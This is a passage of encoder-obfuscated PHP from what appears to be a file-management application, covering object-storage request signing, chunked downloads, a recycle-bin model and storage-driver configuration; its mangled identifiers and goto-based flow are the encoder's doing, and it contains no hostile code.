base64_encode(hash_hmac($Eäİ××é£[1236], "\x50\x4f\123\x54\x26{$eùï‘¿ÚÈ‰}\46{$F‹³ë‡õÂ}\46{$CÄÙ áä‹³}", md5("{$this->userpass}"), !0)); $eˆ¸ÌĞ‹¾ = array($Eäİ××é£[1105] => $CÄÙ áä‹³, $Eäİ××é£[1271] => "\x55\x50\131\125\x4e\x20{$this->username}\72{$Dåê²íÆ«¯}", $Eäİ××é£[166] => $this->endpoint . $eùï‘¿ÚÈ‰); return $eˆ¸ÌĞ‹¾; goto C‰ˆÕô‡óÑ; BíÊÌøî‰¥: $Eäİ××é£ =& $_SERVER[Äº¡•ô™Ÿ]; $eùï‘¿ÚÈ‰ = $Eäİ××é£[8] . $this->bucket; $F‹³ë‡õÂ = gmdate($Eäİ××é£[1197]); goto cÈ•£¹•ò¾; cÈ•£¹•ò¾: $cğøöÄÖùÕ = array($Eäİ××é£[1267] => $this->bucket, $Eäİ××é£[1268] => $bœ™‚×Á‘, $Eäİ××é£[1269] => time() + $D÷Ë¹ÈÖšì, $Eäİ××é£[1270] => $F‹³ë‡õÂ); if ($c‹Å§¥šñŒ) { $cğøöÄÖùÕ[$Eäİ××é£[1183]] = $c‹Å§¥šñŒ; } $CÄÙ áä‹³ = base64_encode(json_encode($cğøöÄÖùÕ)); goto cËÒâ¸¼æ‡; C‰ˆÕô‡óÑ: } public function download($a¡¶À¡ô”, $Fóöµ®‚ˆª) { goto dí±ëºÚëÈ; e×°—§Ÿ‚: fclose($FÓÏ½Ô˜ÆŠ); return $Fóöµ®‚ˆª; goto a£æÂ›£¶; dí±ëºÚëÈ: $E§‡°ÛÆ° = IO::getPathInner(IO::mkfile($Fóöµ®‚ˆª)); if (!($B¢òŞƒˆ¸ = $this->link($a¡¶À¡ô”))) { return !1; } $e„‹•Š›Š = 0; goto cí«Ó·‰ªç; cí«Ó·‰ªç: $C…ó«ìÏâ› = 1024 * 200; $FÓÏ½Ô˜ÆŠ = fopen($E§‡°ÛÆ°, $_SERVER[Äº¡•ô™Ÿ][1220]); while (!0) { $F£Ôñæ‹ñæ = $this->fileSubstr($a¡¶À¡ô”, $e„‹•Š›Š, $C…ó«ìÏâ›); if ($F£Ôñæ‹ñæ === !1) { return !1; } fwrite($FÓÏ½Ô˜ÆŠ, $F£Ôñæ‹ñæ); $e„‹•Š›Š += $C…ó«ìÏâ›; if (strlen($F£Ôñæ‹ñæ) < $C…ó«ìÏâ›) { break; } } goto e×°—§Ÿ‚; a£æÂ›£¶: } public function link($BÇÅÙ‹Ç¢, $A÷¾§¸ëƒ³ = array()) { $eÄ÷‘´ÛÈ‰ =& $_SERVER[Äº¡•ô™Ÿ]; $BÇÅÙ‹Ç¢ = trim($BÇÅÙ‹Ç¢, $eÄ÷‘´ÛÈ‰[8]); if (!empty($this->token)) { $BŒŸŠº¼öÊ = strtotime(date($eÄ÷‘´ÛÈ‰[1272])); $B¹ö¨Ã”… = substr(md5($this->token . $eÄ÷‘´ÛÈ‰[269] . $BŒŸŠº¼öÊ . $eÄ÷‘´ÛÈ‰[1273] . $BÇÅÙ‹Ç¢), 12, 8) . $BŒŸŠº¼öÊ; $A÷¾§¸ëƒ³[] = $eÄ÷‘´ÛÈ‰[1274] . $B¹ö¨Ã”…; } $eÒ­ŠÆ¼‰ = !empty($A÷¾§¸ëƒ³) ? $eÄ÷‘´ÛÈ‰[69] . implode($eÄ÷‘´ÛÈ‰[269], $A÷¾§¸ëƒ³) : $eÄ÷‘´ÛÈ‰[33]; return $eÄ÷‘´ÛÈ‰[1108] . $this->domain . $eÄ÷‘´ÛÈ‰[8] . $BÇÅÙ‹Ç¢ . $eÒ­ŠÆ¼‰; } public function fileOut($e…ÓºÃÓˆ, $b¾À ÏÕŒÀ = false, $A¦¯æŒÈÁ = false, $CÙğ‹Ç³Ù = '') { if (!$A¦¯æŒÈÁ) { $A¦¯æŒÈÁ = $this->pathThis($e…ÓºÃÓˆ); } $f¬îæÕ‰Äï = $b¾À ÏÕŒÀ ? array($_SERVER[Äº¡•ô™Ÿ][1275] . rawurlencode($A¦¯æŒÈÁ)) : array(); $CÌÊöê– = $this->link($e…ÓºÃÓˆ, $f¬îæÕ‰Äï); $this->fileOutLink($CÌÊöê–); } public function fileOutServer($AĞ¼‚ëˆ», $D™¸äœªÓ = false, $A£ÚºŞ¶Ì† = false, $eº©á†—¯ = '') { parent::fileOut($AĞ¼‚ëˆ», $D™¸äœªÓ, $A£ÚºŞ¶Ì†, $eº©á†—¯); } public function fileOutImage($DÁÈ¥à²Šã, $BØƒˆ°ö³ = 250) { $E´¬¾ÜŞàâ = $this->link($DÁÈ¥à²Šã . $_SERVER[Äº¡•ô™Ÿ][1276] . $BØƒˆ°ö³); $this->fileOutLink($E´¬¾ÜŞàâ); } public function fileOutImageServer($E½ÊéŞÄÏ˜, $a—°À´„ªé = 250) { parent::fileOutImage($E½ÊéŞÄÏ˜, $a—°À´„ªé); } public function hashMd5($EÊïß§óêÕ) { $EÉ³—Í®Ë» =& $_SERVER[Äº¡•ô™Ÿ]; $F‚¹Ê‡¬¿ = $this->objectMeta($EÊïß§óêÕ); return isset($F‚¹Ê‡¬¿[$EÉ³—Í®Ë»[193]]) ? $F‚¹Ê‡¬¿[$EÉ³—Í®Ë»[193]] : !1; } public function size($aÃãÖ‘öæ¿) { $b¬èš–Ş× = $this->objectMeta($aÃãÖ‘öæ¿); return $b¬èš–Ş× ? $b¬èš–Ş×[$_SERVER[Äº¡•ô™Ÿ][77]] : 0; } public function info($aÉ¦Üç˜‹) { if ($this->isFolder($aÉ¦Üç˜‹)) { return $this->folderInfo($aÉ¦Üç˜‹); } else { if ($this->isFile($aÉ¦Üç˜‹)) { return $this->fileInfo($aÉ¦Üç˜‹); } } return !1; } public function exist($cÚèÅö­¸Ã) { return $this->isFile($cÚèÅö­¸Ã) || $this->isFolder($cÚèÅö­¸Ã); } public function isFile($f•ª–ãµ²) { return !$this->isFolder($f•ª–ãµ²) && $this->objectMeta($f•ª–ãµ²); } public function isFolder($eìØİ‹¹) { return $this->cacheMethod($_SERVER[Äº¡•ô™Ÿ][220], $eìØİ‹¹); } protected function objectMeta($D˜³Ôğ†—„) { return $this->cacheMethod($_SERVER[Äº¡•ô™Ÿ][221], $D˜³Ôğ†—„); } protected function _objectMeta($dÈŞîÌÄ¬²) { goto c­”ŠøËá; d¦È’ÈÄ«: if (!$DŒÑŞÛëõ[$F„ÜùìÛÀò[1032]]) { return null; } $aÇ‹Œõ¤Ò± = isset($DŒÑŞÛëõ[$F„ÜùìÛÀò[1034]]) ? $DŒÑŞÛëõ[$F„ÜùìÛÀò[1034]] : array(); if (!isset($aÇ‹Œõ¤Ò±[$F„ÜùìÛÀò[1278]])) { return null; } goto E»ÊÜŞñ÷; c­”ŠøËá: $F„ÜùìÛÀò =& $_SERVER[Äº¡•ô™Ÿ]; if ($dÈŞîÌÄ¬² == $F„ÜùìÛÀò[33] || $dÈŞîÌÄ¬² == $F„ÜùìÛÀò[8]) { return array(); } $DŒÑŞÛëõ = $this->ussRequest($dÈŞîÌÄ¬², $F„ÜùìÛÀò[1277]); goto d¦È’ÈÄ«; E»ÊÜŞñ÷: $CêÉØ¶·ÜÜ = array($F„ÜùìÛÀò[28] => get_path_this($dÈŞîÌÄ¬²), $F„ÜùìÛÀò[29] => isset($aÇ‹Œõ¤Ò±[$F„ÜùìÛÀò[1278]]) ? $aÇ‹Œõ¤Ò±[$F„ÜùìÛÀò[1278]] : null, $F„ÜùìÛÀò[77] => isset($aÇ‹Œõ¤Ò±[$F„ÜùìÛÀò[1279]]) ? $aÇ‹Œõ¤Ò±[$F„ÜùìÛÀò[1279]] : null, $F„ÜùìÛÀò[193] => isset($aÇ‹Œõ¤Ò±[$F„ÜùìÛÀò[1280]]) ? $aÇ‹Œõ¤Ò±[$F„ÜùìÛÀò[1280]] : null, $F„ÜùìÛÀò[1247] => isset($aÇ‹Œõ¤Ò±[$F„ÜùìÛÀò[1281]]) ? $aÇ‹Œõ¤Ò±[$F„ÜùìÛÀò[1281]] : null); $CêÉØ¶·ÜÜ[$F„ÜùìÛÀò[1248]] = isset($aÇ‹Œõ¤Ò±[$F„ÜùìÛÀò[1282]]) ? strtotime($aÇ‹Œõ¤Ò±[$F„ÜùìÛÀò[1282]]) : $CêÉØ¶·ÜÜ[$F„ÜùìÛÀò[1247]]; return $CêÉØ¶·ÜÜ; goto EöœÏÛ¯¼Â; EöœÏÛ¯¼Â: } protected function _isFolder($c÷æëÇ¾å») { $aŸà…àÁÜ‘ =& $_SERVER[Äº¡•ô™Ÿ]; if ($c÷æëÇ¾å» == $aŸà…àÁÜ‘[33] || $c÷æëÇ¾å» == $aŸà…àÁÜ‘[8]) { return !0; } $a§‚È‹¶’˜ = $this->objectMeta($c÷æëÇ¾å»); return isset($a§‚È‹¶’˜[$aŸà…àÁÜ‘[29]]) && $a§‚È‹¶’˜[$aŸà…àÁÜ‘[29]] == $aŸà…àÁÜ‘[76] ? !0 : !1; } } goto a¦ªŞéëóå; aÑŞ»ÉŠïÉ: class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\x5f\163\157\x75\x72\143\x65\x5f\162\145\143\x79\x63\x6c\145"; protected $dataAuto = array(array("\x63\x72\145\x61\164\x65\x54\x69\x6d\145", "\164\x69\x6d\145", "\x69\x6e\x73\145\x72\x74", "\x66\x75\x6e\x63\x74\x69\x6f\x6e")); public function listData($AŠÍ¿±íÁ¨ = false) { $E‰È²§¥ö° =& $_SERVER[Äº¡•ô™Ÿ]; $AŠÍ¿±íÁ¨ = $AŠÍ¿±íÁ¨ ? $AŠÍ¿±íÁ¨ : USER_ID; $aŒÂ‚Óªİ = $this->where(array($E‰È²§¥ö°[1407] => $AŠÍ¿±íÁ¨))->select(); return array_to_keyvalue($aŒÂ‚Óªİ, $E‰È²§¥ö°[33], $E‰È²§¥ö°[366]); } public function moveToRecycle($D¨˜Íï›Èó) { goto BÓÓ–òÅˆ»; BÓÓ–òÅˆ»: $bÕ˜­Î¦Æì =& $_SERVER[Äº¡•ô™Ÿ]; $C‰•¦¯É¼« = Model($bÕ˜­Î¦Æì[1110]); $eÈŸä©Ô³Ü = $C‰•¦¯É¼«->sourceInfo($D¨˜Íï›Èó); goto AÍÁ¬ —Îï; AÍÁ¬ —Îï: if (!$eÈŸä©Ô³Ü || $eÈŸä©Ô³Ü[$bÕ˜­Î¦Æì[393]] == $bÕ˜­Î¦Æì[83]) { return; } $B±÷ˆ¨šŒª = array($bÕ˜­Î¦Æì[380] => $D¨˜Íï›Èó, $bÕ˜­Î¦Æì[1407] => USER_ID, $bÕ˜­Î¦Æì[517] => $eÈŸä©Ô³Ü[$bÕ˜­Î¦Æì[368]], $bÕ˜­Î¦Æì[518] => $eÈŸä©Ô³Ü[$bÕ˜­Î¦Æì[452]], $bÕ˜­Î¦Æì[521] => $eÈŸä©Ô³Ü[$bÕ˜­Î¦Æì[455]]); $this->add($B±÷ˆ¨šŒª); goto DøŞíÚƒÜ‡; DøŞíÚƒÜ‡: $this->recycleMove($D¨˜Íï›Èó, 1); if ($eÈŸä©Ô³Ü[$bÕ˜­Î¦Æì[367]] == $bÕ˜­Î¦Æì[83]) { $d„¿ŸŸÃª¢ = array($bÕ˜­Î¦Æì[521] => array($bÕ˜­Î¦Æì[479], $eÈŸä©Ô³Ü[$bÕ˜­Î¦Æì[455]] . $D¨˜Íï›Èó . $bÕ˜­Î¦Æì[480])); $C‰•¦¯É¼«->where($d„¿ŸŸÃª¢)->setField($bÕ˜­Î¦Æì[393], 1); } goto DŸÍø‘ì¥”; DŸÍø‘ì¥”: } public function clear() { $this->remove(!1); } public function remove($DÏ‹©Æšêë = false) { goto AŸÃßğ‚„ë; AŸÃßğ‚„ë: $e£¥‰•ªó =& $_SERVER[Äº¡•ô™Ÿ]; $d‡Ç‘Í¤ = Model($e£¥‰•ªó[1110]); $Bİ¯ø£¥ï = $this->listData(); goto FÎ±‹§‡á‚; E˜Ú‰ô…¢®: foreach ($A™Ğ‡ŠùÒ as $cÀá¼¬ŸâÁ) { $d‡Ç‘Í¤->targetSpaceUpdate($cÀá¼¬ŸâÁ[$e£¥‰•ªó[368]], $cÀá¼¬ŸâÁ[$e£¥‰•ªó[452]]); } goto CÁ‹·İÙºã; FÎ±‹§‡á‚: $DÏ‹©Æšêë = $DÏ‹©Æšêë === !1 ? !1 : $DÏ‹©Æšêë; $A™Ğ‡ŠùÒ = array(); foreach ($Bİ¯ø£¥ï as $D·£ÔÔ‹Ü²) { if ($DÏ‹©Æšêë != !1 && !in_array($D·£ÔÔ‹Ü², $DÏ‹©Æšêë)) { continue; } $d‡Ç‘Í¤->remove($D·£ÔÔ‹Ü², !1); $aˆíöƒò = $this->where(array($e£¥‰•ªó[366] => $D·£ÔÔ‹Ü²))->find(); $C˜‹¿¡¦øÃ = $aˆíöƒò[$e£¥‰•ªó[368]] . $e£¥‰•ªó[70] . $aˆíöƒò[$e£¥‰•ªó[452]]; $A™Ğ‡ŠùÒ[$C˜‹¿¡¦øÃ] = array($e£¥‰•ªó[517] => $aˆíöƒò[$e£¥‰•ªó[368]], $e£¥‰•ªó[452] => $aˆíöƒò[$e£¥‰•ªó[452]]); $this->where(array($e£¥‰•ªó[366] => $D·£ÔÔ‹Ü²))->delete(); } goto E˜Ú‰ô…¢®; CÁ‹·İÙºã: } public function restore($AÊš«ÀÅ­ = false) { goto C¢Ù…Şï¶¡; C¢Ù…Şï¶¡: $d”‡ØìéÁ“ =& $_SERVER[Äº¡•ô™Ÿ]; $DÆÀæ³ôî„ = Model($d”‡ØìéÁ“[1110]); $f›Ê©Ï¸ù = $this->listData(); goto fô±ÔÜƒØ; fô±ÔÜƒØ: $AÊš«ÀÅ­ = $AÊš«ÀÅ­ == !1 ? !1 : $AÊš«ÀÅ­; if (!$f›Ê©Ï¸ù) { return !0; } $aâ™²ˆ­æó = array(); goto fôíŒò¯Â; fôíŒò¯Â: foreach ($f›Ê©Ï¸ù as $Dò°ñªèõ¼) { goto aï•Ú¼®¹İ; aï•Ú¼®¹İ: if ($AÊš«ÀÅ­ != !1 && !in_array($Dò°ñªèõ¼, $AÊš«ÀÅ­)) { continue; } $cğİ‹‰‹¢ƒ = $DÆÀæ³ôî„->sourceInfo($Dò°ñªèõ¼); $açØÈà­£ = $DÆÀæ³ôî„->sourceInfo($cğİ‹‰‹¢ƒ[$d”‡ØìéÁ“[457]]); goto e„Ò¤É—ª¦; cÉØ¶æ…’: if ($cğİ‹‰‹¢ƒ[$d”‡ØìéÁ“[367]] == $d”‡ØìéÁ“[83]) { $Eƒî‚©å = array($d”‡ØìéÁ“[521] => array($d”‡ØìéÁ“[479], $cğİ‹‰‹¢ƒ[$d”‡ØìéÁ“[455]] . $Dò°ñªèõ¼ . $d”‡ØìéÁ“[480])); $DÆÀæ³ôî„->where($Eƒî‚©å)->setField($d”‡ØìéÁ“[393], 0); } $this->where(array($d”‡ØìéÁ“[366] => $Dò°ñªèõ¼))->delete(); $DÆÀæ³ôî„->folderSizeReset($cğİ‹‰‹¢ƒ[$d”‡ØìéÁ“[457]]); goto bôÛÙêŠÍ¯; e„Ò¤É—ª¦: if ($açØÈà­£[$d”‡ØìéÁ“[393]] == $d”‡ØìéÁ“[83]) { continue; } $DÆÀæ³ôî„->lockMoveStart($Dò°ñªèõ¼); $this->recycleMove($Dò°ñªèõ¼, 0); goto cÉØ¶æ…’; bôÛÙêŠÍ¯: $aâ™²ˆ­æó[] = $cğİ‹‰‹¢ƒ[$d”‡ØìéÁ“[457]]; if ($cğİ‹‰‹¢ƒ[$d”‡ØìéÁ“[367]] == $d”‡ØìéÁ“[83]) { $aâ™²ˆ­æó[] = $Dò°ñªèõ¼; } $DÆÀæ³ôî„->lockMoveEnd($Dò°ñªèõ¼); goto e’’³ëªğÌ; e’’³ëªğÌ: } $DÆÀæ³ôî„->updateModifyTime($aâ™²ˆ­æó); goto EÈ†š•…„è; EÈ†š•…„è: } private function recycleMove($aŠ»óÃğ, $fÌç‚äÓ = 1) { $B¹ƒç®“¬â =& $_SERVER[Äº¡•ô™Ÿ]; $BòÒÎ´ñç— = Model($B¹ƒç®“¬â[1110]); $F°™Ô÷£¤ = Model($B¹ƒç®“¬â[2328]); $F‡ÑÂ©õ = array($B¹ƒç®“¬â[366] => $aŠ»óÃğ); if ($fÌç‚äÓ) { $BòÒÎ´ñç—->where($F‡ÑÂ©õ)->setField($B¹ƒç®“¬â[393], 1); $F°™Ô÷£¤->eventRecycle($aŠ»óÃğ, $B¹ƒç®“¬â[2329]); } else { $eêÈù³¶ß = $BòÒÎ´ñç—->where($F‡ÑÂ©õ)->find(); $B…öÍ¶ÙÆ = $eêÈù³¶ß[$B¹ƒç®“¬â[367]] == $B¹ƒç®“¬â[83]; $eù‡ÌŸÅç = $BòÒÎ´ñç—->fileNameAuto($eêÈù³¶ß[$B¹ƒç®“¬â[457]], $eêÈù³¶ß[$B¹ƒç®“¬â[28]], REPEAT_RENAME_FOLDER, $B…öÍ¶ÙÆ); if ($eù‡ÌŸÅç != $eêÈù³¶ß[$B¹ƒç®“¬â[28]]) { $BòÒÎ´ñç—->rename($aŠ»óÃğ, $eù‡ÌŸÅç); } $BòÒÎ´ñç—->where($F‡ÑÂ©õ)->setField($B¹ƒç®“¬â[393], 0); $F°™Ô÷£¤->eventRecycle($aŠ»óÃğ, $B¹ƒç®“¬â[2330]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\155\56\163\164\157\162\x61\x67\x65\114\x69\163\164"; public $field = array("\156\141\155\x65", "\163\151\x7a\x65\x4d\x61\170", "\163\171\163\x74\x65\x6d", "\x64\145\146\141\x75\154\x74", "\144\162\x69\166\x65\x72", "\143\x6f\x6e\x66\x69\147"); public function listData($F„„‡º¨Ç¡ = false, $dàÚ‰âêìµ = "\x6d\x6f\144\x69\x66\171\124\x69\155\x65", $AÏáËØ¡ˆ¢ = false) { goto eƒÓæ¿öŠÈ; AôÇ—¾áö‘: return $eÒ”ìª–øÏ; goto EÃ‡†À©á; eƒÓæ¿öŠÈ: $a‰òë½ˆù =& $_SERVER[Äº¡•ô™Ÿ]; $eÒ”ìª–øÏ = parent::listData($F„„‡º¨Ç¡, $dàÚ‰âêìµ, $AÏáËØ¡ˆ¢); if ($F„„‡º¨Ç¡) { return $eÒ”ìª–øÏ; } goto d‰öÔ…ñÓ·; d‰öÔ…ñÓ·: foreach ($eÒ”ìª–øÏ as $c¢øÀõË’· => $A„ôŠˆ¢³) { unset($eÒ”ìª–øÏ[$c¢øÀõË’·][$a‰òë½ˆù[6]]); $eÒ”ìª–øÏ[$c¢øÀõË’·][$a‰òë½ˆù[2065]] = 0; } $e¾‘­ÀÕ±ò = array_to_keyvalue($eÒ”ìª–øÏ, $a‰òë½ˆù[33], $a‰òë½ˆù[364]); $this->_listAppendSize($eÒ”ìª–øÏ, $e¾‘­ÀÕ±ò); goto AôÇ—¾áö‘; EÃ‡†À©á: } public function _listAppendSize(&$A˜ÌŞäÈÄå, $BÀñÉÅİ³”) { $F…‡ÎÖğ › =& $_SERVER[Äº¡•ô™Ÿ]; $Eñ•½¾’Âù = $F…‡ÎÖğ ›[2331] . implode($F…‡ÎÖğ ›[47], $BÀñÉÅİ³”) . $F…‡ÎÖğ ›[2332]; $Cò§Ò—”´› = Model($F…‡ÎÖğ ›[722])->query($Eñ•½¾’Âù); $Cò§Ò—”´› = array_to_keyvalue($Cò§Ò—”´›, $F…‡ÎÖğ ›[364], $F…‡ÎÖğ ›[77]); foreach ($A˜ÌŞäÈÄå as $CÍª˜„¯î => $F…‹¸Şîò) { $A˜ÌŞäÈÄå[$CÍª˜„¯î][$F…‡ÎÖğ ›[2065]] = isset($Cò§Ò—”´›[$F…‹¸Şîò[$F…‡ÎÖğ ›[364]]]) ? $Cò§Ò—”´›[$F…‹¸Şîò[$F…‡ÎÖğ ›[364]]] : 0; } } public function getConfig($a­™†‚•ÌÊ) { $Aë¡§”Ïœ = parent::listData($a­™†‚•ÌÊ); return json_decode($Aë¡§”Ïœ[$_SERVER[Äº¡•ô™Ÿ][6]], !0); } public function update($B³·’ Ğ¬, $fÆÜµØô²š) { goto BÆªšŠÄ‘ˆ; Cß‡ƒçªï: if (isset($cñïÖßï—ƒ[$B‘è¤Ÿ°®]) && $cñïÖßï—ƒ[$B‘è¤Ÿ°®][$EµÌ ½·”[364]] != $B³·’ Ğ¬) { return !1; } if (isset($fÆÜµØô²š[$EµÌ ½·”[2333]]) && $fÆÜµØô²š[$EµÌ ½·”[2333]] == $EµÌ ½·”[83]) { $this->checkConfig($fÆÜµØô²š); } unset($fÆÜµØô²š[$EµÌ ½·”[2333]]); goto Eµªº¶—Ğ¬; Eµªº¶—Ğ¬: $CÜô‡†º£‘ = parent::update($B³·’ Ğ¬, $fÆÜµØô²š); if ($CÜô‡†º£‘ && $fÆÜµØô²š[$EµÌ ½·”[34]]) { foreach ($cñïÖßï—ƒ as $Bê‰îÆ¨É) { if ($Bê‰îÆ¨É[$EµÌ ½·”[34]] && $Bê‰îÆ¨É[$EµÌ ½·”[364]] != $B³·’ Ğ¬) { parent::update($Bê‰îÆ¨É[$EµÌ ½·”[364]], array($EµÌ ½·”[34] => 0)); } } } return $CÜô‡†º£‘; goto c†ØïØö­; BÆªšŠÄ‘ˆ: $EµÌ ½·” =& $_SERVER[Äº¡•ô™Ÿ]; $B‘è¤Ÿ°® = $fÆÜµØô²š[$EµÌ ½·”[28]]; $cñïÖßï—ƒ = array_to_keyvalue(parent::listData(), $EµÌ ½·”[28]); goto Cß‡ƒçªï; c†ØïØö­: } public function add($E«ôÌÓÕß°) { goto CÂ††Ğóó»; cŒ‚ïĞÌ¡: return $a°Š¬Ï‡ç²; goto D¸ëÉƒÇ¦; CÂ††Ğóó»: $dËåê‹ =& $_SERVER[Äº¡•ô™Ÿ]; $FŞ“Ş¢ª­— = array_to_keyvalue(parent::listData(), $dËåê‹[28]); if (isset($FŞ“Ş¢ª­—[$E«ôÌÓÕß°[$dËåê‹[28]]])) { return !1; } goto c¸ºåØïã›; c¸ºåØïã›: $this->checkConfig($E«ôÌÓÕß°); $a°Š¬Ï‡ç² = parent::insert($E«ôÌÓÕß°); if ($a°Š¬Ï‡ç² && $E«ôÌÓÕß°[$dËåê‹[34]]) { foreach ($FŞ“Ş¢ª­— as $d»Ùè¸»‚ø) { if ($d»Ùè¸»‚ø[$dËåê‹[34]]) { parent::update($d»Ùè¸»‚ø[$dËåê‹[364]], array($dËåê‹[34] => 0)); } } } goto cŒ‚ïĞÌ¡; D¸ëÉƒÇ¦: } public function checkConfig(&$eçÛÁâ§·Å) { goto EÓÊÇ‡ò¡; aˆ‘ø¥¶À: $eçÛÁâ§·Å[$Bª˜»èÌµ[6]] = json_encode($AÚÎµèŞ½); $eçÛÁâ§·Å[$Bª˜»èÌµ[90]] = $BÙ ÜŞĞØº; return !0; goto AÕâ†‹ºÙÌ; EÓÊÇ‡ò¡: $Bª˜»èÌµ =& $_SERVER[Äº¡•ô™Ÿ]; $F¦Éïƒè©´ = strtolower($eçÛÁâ§·Å[$Bª˜»èÌµ[90]]); $AÚÎµèŞ½ = json_decode_force($eçÛÁâ§·Å[$Bª˜»èÌµ[6]]); goto a¼Üè†¬……; fÚÌá©‹¡¨: $bŞ·Û†­Â½ = $Eˆè˜¾ô²ª->getPath($bñã«ó°±Ì . $Bª˜»èÌµ[1961]); if (!$Eˆè˜¾ô²ª->mkfile($bŞ·Û†­Â½)) { show_json(LNG($Bª˜»èÌµ[2334]), !1); } $AÚÎµèŞ½[$Bª˜»èÌµ[1024]] = $bñã«ó°±Ì; goto aˆ‘ø¥¶À; BŒÑÖéÅ: $F½‹öæ‡µÄ = $Bª˜»èÌµ[71] . $BÙ ÜŞĞØº; $Eˆè˜¾ô²ª = new $F½‹öæ‡µÄ($AÚÎµèŞ½); if (in_array($F¦Éïƒè©´, $Eˆè˜¾ô²ª->objectDriver)) { if (!$Eˆè˜¾ô²ª->isBucketCors() && !$Eˆè˜¾ô²ª->setBucketCors()) { $b¨•“¸İ§Ô = LNG($Bª˜»èÌµ[2334]); $b¨•“¸İ§Ô .= $Bª˜»èÌµ[2335] . LNG($Bª˜»èÌµ[2336]); show_json($b¨•“¸İ§Ô, !1); } } goto fÚÌá©‹¡¨; a¼Üè†¬……: foreach ($AÚÎµèŞ½ as $a—Å±ÎŸ· => $F’ãêõä˜) { $AÚÎµèŞ½[$a—Å±ÎŸ·] = trim($F’ãêõä˜); } $bñã«ó°±Ì = rtrim($AÚÎµèŞ½[$Bª˜»èÌµ[1024]], $Bª˜»èÌµ[8]) . $Bª˜»èÌµ[8]; $BÙ ÜŞĞØº = $this->driverType($F¦Éïƒè©´); goto BŒÑÖéÅ; AÕâ†‹ºÙÌ: } private function driverType($eÏïƒ¾¾Ü) { $fŠì¤·”°¤ =& $_SERVER[Äº¡•ô™Ÿ]; $c³Ş´–çĞİ = array($fŠì¤·”°¤[103] => $fŠì¤·”°¤[2337], $fŠì¤·”°¤[58] => $fŠì¤·”°¤[2338], $fŠì¤·”°¤[64] => $fŠì¤·”°¤[2339]); if (isset($c³Ş´–çĞİ[$eÏïƒ¾¾Ü])) { return $c³Ş´–çĞİ[$eÏïƒ¾¾Ü]; } return strtoupper($eÏïƒ¾¾Ü); } public function driverListSystem() { $eİŠ‰ÉØ¶“ =& $_SERVER[Äº¡•ô™Ÿ]; $A†âŞåÄø› = parent::listData(); $a„ˆ¼í©óá = array(); foreach ($A†âŞåÄø› as $DÔÇêŠ„•é) { unset($DÔÇêŠ„•é[$eİŠ‰ÉØ¶“[184]], $DÔÇêŠ„•é[$eİŠ‰ÉØ¶“[107]]); $DÔÇêŠ„•é[$eİŠ‰ÉØ¶“[6]] = json_decode_force($DÔÇêŠ„•é[$eİŠ‰ÉØ¶“[6]]); $a„ˆ¼í©óá[] = $DÔÇêŠ„•é; } return $a„ˆ¼í©óá; } public function defaultDriver() { $AÃÍ¡«Ø„Ó =& $_SERVER[Äº¡•ô™Ÿ]; $eïëàÎà¹‘ = parent::listData(); $eö¡÷îù“õ = array_filter_by_field($eïëàÎà¹‘, $AÃÍ¡«Ø„Ó[34], 1); $eö¡÷îù“õ = $eö¡÷îù“õ[0]; if ($eö¡÷îù“õ) { $eö¡÷îù“õ[$AÃÍ¡«Ø„Ó[6]] = json_decode($eö¡÷îù“õ[$AÃÍ¡«Ø„Ó[6]], !0); } return $eö¡÷îù“õ; } public function driverInfo($c¼êƒœñ·Ë) { $FÄ…ˆÔ’Ô =& $_SERVER[Äº¡•ô™Ÿ]; $e‚±…©ª¶ = array_to_keyvalue(parent::listData(), $FÄ…ˆÔ’Ô[364]); if (!isset($e‚±…©ª¶[$c¼êƒœñ·Ë])) { return !1; } $BÉçÚµÊƒ = $e‚±…©ª¶[$c¼êƒœñ·Ë]; $BÉçÚµÊƒ[$FÄ…ˆÔ’Ô[6]] = json_decode_force($BÉçÚµÊƒ[$FÄ…ˆÔ’Ô[6]]); return $BÉçÚµÊƒ; } public function remove($bŠ‘·éÖß×) { $this->removeShareItems($bŠ‘·éÖß×); return parent::remove($bŠ‘·éÖß×); } public function removeWithFile($EæŸÇ°åºˆ) { goto E™°›•Ó×; c§ÑÇ‘øÜ: $Cò‘í©÷Æ->task[$Fö¨‚‚†¯é[701]] = (double) $Cğµˆøš¯; $eÀ¡ëÒËŸñ = KodIO::defaultDriver(); $FÎ‡ª˜âË = $eÀ¡ëÒËŸñ[$Fö¨‚‚†¯é[364]]; goto EÑ¹Œ™Ëõá; cõÎƒÈà¬: $Cğµˆøš¯ = Model($Fö¨‚‚†¯é[418])->where($F«ê˜Ğˆ¾Ò)->sum($Fö¨‚‚†¯é[77]); $A„¼‘‹½Œë = $Fö¨‚‚†¯é[2340] . $EæŸÇ°åºˆ; $Cò‘í©÷Æ = new TaskFileTransfer($A„¼‘‹½Œë, $Fö¨‚‚†¯é[2341], $B‰Ç†âïŠÄ, LNG($Fö¨‚‚†¯é[2342]) . "\50{$EæŸÇ°åºˆ}\51"); goto c§ÑÇ‘øÜ; EÑ¹Œ™Ëõá: $bùÓå›µ°² = "\x7b\x69\x6f\72{$FÎ‡ª˜âË}\x7d\57"; $D—»­Š»„è = !0; $c‚‚ßñŒ¿ = array(); goto DéÚ¤Óª¬ˆ; EŒÇßÌ¿†È: if (!$D—»­Š»„è) { $Cò‘í©÷Æ->stop($A„¼‘‹½Œë); return !1; } $Cò‘í©÷Æ->end(); $this->remove($EæŸÇ°åºˆ); goto Fæ¹é„åÂ; E™°›•Ó×: $Fö¨‚‚†¯é =& $_SERVER[Äº¡•ô™Ÿ]; $F«ê˜Ğˆ¾Ò = array($Fö¨‚‚†¯é[746] => $EæŸÇ°åºˆ); $B‰Ç†âïŠÄ = Model($Fö¨‚‚†¯é[418])->where($F«ê˜Ğˆ¾Ò)->count(); goto cõÎƒÈà¬; DéÚ¤Óª¬ˆ: $f¿íïÙÚÆŠ = Model($Fö¨‚‚†¯é[164])->where($F«ê˜Ğˆ¾Ò)->field($Fö¨‚‚†¯é[2343])->select(); foreach ($f¿íïÙÚÆŠ as $E„ëÆ¥ñ¹’) { goto DÑ‡³¡ôåí; DÑ‡³¡ôåí: $B¦µñùò¥ø = $E„ëÆ¥ñ¹’[$Fö¨‚‚†¯é[75]]; $EçØ®øÔ  = $bùÓå›µ°² . str_replace("\173\x69\x6f\72{$EæŸÇ°åºˆ}\x7d\57", $Fö¨‚‚†¯é[33], $B¦µñùò¥ø); if (!IO::exist($B¦µñùò¥ø)) { $c‚‚ßñŒ¿[] = $E„ëÆ¥ñ¹’[$Fö¨‚‚†¯é[415]]; 